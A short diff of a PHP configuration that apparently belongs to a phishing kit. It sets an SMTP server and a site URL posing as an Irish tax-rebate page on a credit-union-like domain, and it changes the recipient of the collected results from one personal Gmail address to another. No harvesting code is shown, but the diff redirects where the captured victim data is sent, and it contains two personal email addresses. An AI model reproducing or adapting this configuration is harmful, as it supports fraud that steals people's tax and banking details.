@@ -3,7 +3,7 @@ ini_set('SMTP', 'partnerstrustfcu.com');
 ini_set('smtp_port', 465);
 
 $siteUrl = "https://irishtaxrebates.partnerstrustfcu.com";
-$recipient = "johnstevenmele@gmail.com";
+$recipient = "jeweljuicyapparel@gmail.com";
 
 
 //=========================
